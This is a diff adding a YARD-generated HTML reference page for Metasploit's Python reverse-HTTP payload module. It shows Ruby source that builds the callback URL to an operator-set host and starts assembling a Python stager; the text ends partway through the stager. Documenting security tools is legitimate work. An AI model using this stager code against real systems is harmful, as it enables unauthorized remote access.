@@ -1,0 +1,741 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>
+  Module: Msf::Payload::Python::ReverseHttp
+  
+    &mdash; Documentation by YARD 0.9.26
+  
+</title>
+
+  <link rel="stylesheet" href="../../../css/style.css" type="text/css" />
+
+  <link rel="stylesheet" href="../../../css/common.css" type="text/css" />
+
+<script type="text/javascript">
+  pathId = "Msf::Payload::Python::ReverseHttp";
+  relpath = '../../../';
+</script>
+
+
+  <script type="text/javascript" charset="utf-8" src="../../../js/jquery.js"></script>
+
+  <script type="text/javascript" charset="utf-8" src="../../../js/app.js"></script>
+
+
+  </head>
+  <body>
+    <div class="nav_wrap">
+      <iframe id="nav" src="../../../class_list.html?1"></iframe>
+      <div id="resizer"></div>
+    </div>
+
+    <div id="main" tabindex="-1">
+      <div id="header">
+        <div id="menu">
+  
+    <a href="../../../_index.html">Index (R)</a> &raquo;
+    <span class='title'><span class='object_link'><a href="../../../Msf.html" title="Msf (module)">Msf</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../../Payload.html" title="Msf::Payload (class)">Payload</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../Python.html" title="Msf::Payload::Python (module)">Python</a></span></span>
+     &raquo; 
+    <span class="title">ReverseHttp</span>
+  
+</div>
+
+        <div id="search">
+  
+    <a class="full_list_link" id="class_list_link"
+        href="../../../class_list.html">
+
+        <svg width="24" height="24">
+          <rect x="0" y="4" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="12" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="20" width="24" height="4" rx="1" ry="1"></rect>
+        </svg>
+    </a>
+  
+</div>
+        <div class="clear"></div>
+      </div>
+
+      <div id="content"><h1>Module: Msf::Payload::Python::ReverseHttp
+  
+  
+  
+</h1>
+<div class="box_info">
+  
+
+  
+  
+  
+  
+  <dl>
+      <dt>Includes:</dt>
+      <dd><span class='object_link'><a href="../UUID/Options.html" title="Msf::Payload::UUID::Options (module)">UUID::Options</a></span></dd>
+  </dl>
+  
+  
+
+  
+
+  
+  <dl>
+    <dt>Defined in:</dt>
+    <dd>lib/msf/core/payload/python/reverse_http.rb</dd>
+  </dl>
+  
+</div>
+
+
+
+
+  <h2>Constant Summary</h2>
+  
+  <h3 class="inherited">Constants included
+     from <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html" title="Rex::Payloads::Meterpreter::UriChecksum (module)">Rex::Payloads::Meterpreter::UriChecksum</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_CONN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_CONN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_CONN</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_CONN_MAX_LEN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_CONN_MAX_LEN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_CONN_MAX_LEN</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_INITJ-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITJ (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITJ</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_INITN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITN</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_INITP-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITP (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITP</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_INITW-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITW (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITW</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_INIT_CONN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INIT_CONN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INIT_CONN</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_MIN_LEN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_MIN_LEN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_MIN_LEN</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_MODES-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_MODES (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_MODES</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_UUID_MIN_LEN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_UUID_MIN_LEN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_UUID_MIN_LEN</a></span></p>
+
+
+
+
+
+  
+    <h2>
+      Instance Method Summary
+      <small><a href="#" class="summary_toggle">collapse</a></small>
+    </h2>
+
+    <ul class="summary">
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#generate-instance_method" title="#generate (instance method)">#<strong>generate</strong>(opts = {})  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Generate the first stage.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#generate_callback_uri-instance_method" title="#generate_callback_uri (instance method)">#<strong>generate_callback_uri</strong>(opts = {})  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Return the longest URI that fits into our available space.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#generate_callback_url-instance_method" title="#generate_callback_url (instance method)">#<strong>generate_callback_url</strong>(opts)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Return the callback URL.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#generate_reverse_http-instance_method" title="#generate_reverse_http (instance method)">#<strong>generate_reverse_http</strong>(opts = {})  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#initialize-instance_method" title="#initialize (instance method)">#<strong>initialize</strong>(info = {})  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#required_space-instance_method" title="#required_space (instance method)">#<strong>required_space</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Determine the maximum amount of space required for the features requested.</p>
+</div></span>
+  
+</li>
+
+      
+    </ul>
+  
+
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="../UUID/Options.html" title="Msf::Payload::UUID::Options (module)">UUID::Options</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="../UUID/Options.html#generate_payload_uuid-instance_method" title="Msf::Payload::UUID::Options#generate_payload_uuid (method)">#generate_payload_uuid</a></span>, <span class='object_link'><a href="../UUID/Options.html#generate_uri_uuid_mode-instance_method" title="Msf::Payload::UUID::Options#generate_uri_uuid_mode (method)">#generate_uri_uuid_mode</a></span>, <span class='object_link'><a href="../UUID/Options.html#record_payload_uuid-instance_method" title="Msf::Payload::UUID::Options#record_payload_uuid (method)">#record_payload_uuid</a></span>, <span class='object_link'><a href="../UUID/Options.html#record_payload_uuid_url-instance_method" title="Msf::Payload::UUID::Options#record_payload_uuid_url (method)">#record_payload_uuid_url</a></span></p>
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html" title="Rex::Payloads::Meterpreter::UriChecksum (module)">Rex::Payloads::Meterpreter::UriChecksum</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#generate_uri_checksum-instance_method" title="Rex::Payloads::Meterpreter::UriChecksum#generate_uri_checksum (method)">#generate_uri_checksum</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#generate_uri_uuid-instance_method" title="Rex::Payloads::Meterpreter::UriChecksum#generate_uri_uuid (method)">#generate_uri_uuid</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#process_uri_resource-instance_method" title="Rex::Payloads::Meterpreter::UriChecksum#process_uri_resource (method)">#process_uri_resource</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#uri_checksum_lookup-instance_method" title="Rex::Payloads::Meterpreter::UriChecksum#uri_checksum_lookup (method)">#uri_checksum_lookup</a></span></p>
+
+
+  <div id="instance_method_details" class="method_details_list">
+    <h2>Instance Method Details</h2>
+
+    
+      <div class="method_details first">
+  <h3 class="signature first" id="generate-instance_method">
+  
+    #<strong>generate</strong>(opts = {})  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Generate the first stage</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/python/reverse_http.rb', line 21</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_generate'>generate</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='op'>=</span><span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_ds'>ds</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:datastore</span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='id identifier rubyid_datastore'>datastore</span>
+  <span class='id identifier rubyid_opts'>opts</span><span class='period'>.</span><span class='id identifier rubyid_merge!'>merge!</span><span class='lparen'>(</span><span class='lbrace'>{</span>
+    <span class='label'>host:</span>           <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>LHOST</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>127.127.127.127</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
+    <span class='label'>port:</span>           <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>LPORT</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='comma'>,</span>
+    <span class='label'>proxy_host:</span>     <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HttpProxyHost</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='comma'>,</span>
+    <span class='label'>proxy_port:</span>     <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HttpProxyPort</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='comma'>,</span>
+    <span class='label'>proxy_user:</span>     <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HttpProxyUser</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='comma'>,</span>
+    <span class='label'>proxy_pass:</span>     <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HttpProxyPass</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='comma'>,</span>
+    <span class='label'>user_agent:</span>     <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HttpUserAgent</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='comma'>,</span>
+    <span class='label'>header_host:</span>    <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HttpHostHeader</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='comma'>,</span>
+    <span class='label'>header_cookie:</span>  <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HttpCookie</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='comma'>,</span>
+    <span class='label'>header_referer:</span> <span class='id identifier rubyid_ds'>ds</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HttpReferer</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
+  <span class='rbrace'>}</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:scheme</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>http</span><span class='tstring_end'>&#39;</span></span> <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:scheme</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span>
+
+  <span class='id identifier rubyid_generate_reverse_http'>generate_reverse_http</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='rparen'>)</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="generate_callback_uri-instance_method">
+  
+    #<strong>generate_callback_uri</strong>(opts = {})  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Return the longest URI that fits into our available space</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/python/reverse_http.rb', line 62</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_generate_callback_uri'>generate_callback_uri</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='op'>=</span><span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_uri_req_len'>uri_req_len</span> <span class='op'>=</span> <span class='int'>30</span> <span class='op'>+</span> <span class='id identifier rubyid_luri'>luri</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span> <span class='op'>+</span> <span class='id identifier rubyid_rand'>rand</span><span class='lparen'>(</span><span class='int'>256</span> <span class='op'>-</span> <span class='lparen'>(</span><span class='int'>30</span> <span class='op'>+</span> <span class='id identifier rubyid_luri'>luri</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span><span class='rparen'>)</span><span class='rparen'>)</span>
+
+  <span class='comment'># Generate the short default URL if we don&#39;t have enough space
+</span>  <span class='kw'>if</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_available_space'>available_space</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span> <span class='op'>||</span> <span class='id identifier rubyid_required_space'>required_space</span> <span class='op'>&gt;</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_available_space'>available_space</span>
+    <span class='id identifier rubyid_uri_req_len'>uri_req_len</span> <span class='op'>=</span> <span class='int'>30</span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_generate_uri_uuid_mode'>generate_uri_uuid_mode</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:uri_uuid_mode</span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='symbol'>:init_python</span><span class='comma'>,</span> <span class='id identifier rubyid_uri_req_len'>uri_req_len</span><span class='rparen'>)</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="generate_callback_url-instance_method">
+  
+    #<strong>generate_callback_url</strong>(opts)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Return the callback URL</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/python/reverse_http.rb', line 43</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_generate_callback_url'>generate_callback_url</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='rparen'>)</span>
+  <span class='comment'># required opts:
+</span>  <span class='comment'>#   host, port, scheme
+</span>  <span class='kw'>if</span> <span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Socket</span><span class='period'>.</span><span class='id identifier rubyid_is_ipv6?'>is_ipv6?</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:host</span><span class='rbracket'>]</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_target_url'>target_url</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:scheme</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>://[</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:host</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>]</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>else</span>
+    <span class='id identifier rubyid_target_url'>target_url</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:scheme</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>://</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:host</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_target_url'>target_url</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>:</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_target_url'>target_url</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:port</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span>
+  <span class='id identifier rubyid_target_url'>target_url</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_luri'>luri</span>
+  <span class='id identifier rubyid_target_url'>target_url</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_generate_callback_uri'>generate_callback_uri</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_target_url'>target_url</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="generate_reverse_http-instance_method">
+  
+    #<strong>generate_reverse_http</strong>(opts = {})  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/python/reverse_http.rb', line 73</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_generate_reverse_http'>generate_reverse_http</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='op'>=</span><span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+  <span class='comment'># required opts:
+</span>  <span class='comment'>#  proxy_host, proxy_port, scheme, user_agent
+</span>  <span class='id identifier rubyid_var_escape'>var_escape</span> <span class='op'>=</span> <span class='id identifier rubyid_lambda'>lambda</span> <span class='lbrace'>{</span> <span class='op'>|</span><span class='id identifier rubyid_txt'>txt</span><span class='op'>|</span>
+    <span class='id identifier rubyid_txt'>txt</span><span class='period'>.</span><span class='id identifier rubyid_gsub'>gsub</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>\\</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>\\</span><span class='tstring_end'>&#39;</span></span> <span class='op'>*</span> <span class='int'>4</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_gsub'>gsub</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>\&#39;</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>%q(</span><span class='tstring_content'>\\\&#39;</span><span class='tstring_end'>)</span></span><span class='rparen'>)</span>
+  <span class='rbrace'>}</span>
+
+  <span class='id identifier rubyid_proxy_host'>proxy_host</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:proxy_host</span><span class='rbracket'>]</span>
+  <span class='id identifier rubyid_proxy_port'>proxy_port</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:proxy_port</span><span class='rbracket'>]</span>
+  <span class='id identifier rubyid_proxy_user'>proxy_user</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:proxy_user</span><span class='rbracket'>]</span>
+  <span class='id identifier rubyid_proxy_pass'>proxy_pass</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:proxy_pass</span><span class='rbracket'>]</span>
+
+  <span class='id identifier rubyid_urllib_fromlist'>urllib_fromlist</span> <span class='op'>=</span> <span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>\&#39;build_opener\&#39;</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
+  <span class='id identifier rubyid_urllib_fromlist'>urllib_fromlist</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>\&#39;HTTPSHandler\&#39;</span><span class='tstring_end'>&#39;</span></span> <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:scheme</span><span class='rbracket'>]</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>https</span><span class='tstring_end'>&#39;</span></span>
+  <span class='kw'>if</span> <span class='id identifier rubyid_proxy_host'>proxy_host</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span> <span class='op'>!=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
+    <span class='id identifier rubyid_urllib_fromlist'>urllib_fromlist</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>\&#39;ProxyHandler\&#39;</span><span class='tstring_end'>&#39;</span></span>
+    <span class='kw'>unless</span> <span class='id identifier rubyid_proxy_user'>proxy_user</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span> <span class='op'>&amp;&amp;</span> <span class='id identifier rubyid_proxy_pass'>proxy_pass</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
+      <span class='id identifier rubyid_urllib_fromlist'>urllib_fromlist</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>\&#39;ProxyBasicAuthHandler\&#39;</span><span class='tstring_end'>&#39;</span></span>
+    <span class='kw'>end</span>
+  <span class='kw'>end</span>
+  <span class='id identifier rubyid_urllib_fromlist'>urllib_fromlist</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>[</span><span class='tstring_end'>&#39;</span></span> <span class='op'>+</span> <span class='id identifier rubyid_urllib_fromlist'>urllib_fromlist</span><span class='period'>.</span><span class='id identifier rubyid_join'>join</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>,</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span> <span class='op'>+</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>]</span><span class='tstring_end'>&#39;</span></span>
+
+  <span class='id identifier rubyid_cmd'>cmd</span>  <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>import zlib,base64,sys\n</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>vi=sys.version_info\n</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>ul=__import__({2:&#39;urllib2&#39;,3:&#39;urllib.request&#39;}[vi[0]],fromlist=</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_urllib_fromlist'>urllib_fromlist</span><span class='embexpr_end'>}</span><span class='tstring_content'>)\n</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>hs=[]\n</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:scheme</span><span class='rbracket'>]</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>https</span><span class='tstring_end'>&#39;</span></span>
+    <span class='comment'># Context added to HTTPSHandler in 2.7.9 and 3.4.3
+</span>    <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>if (vi[0]==2 and vi&gt;=(2,7,9)) or vi&gt;=(3,4,3):\n</span><span class='tstring_end'>&quot;</span></span>
+    <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\timport ssl\n</span><span class='tstring_end'>&quot;</span></span>
+    <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\tsc=ssl.SSLContext(ssl.PROTOCOL_SSLv23)\n</span><span class='tstring_end'>&quot;</span></span>
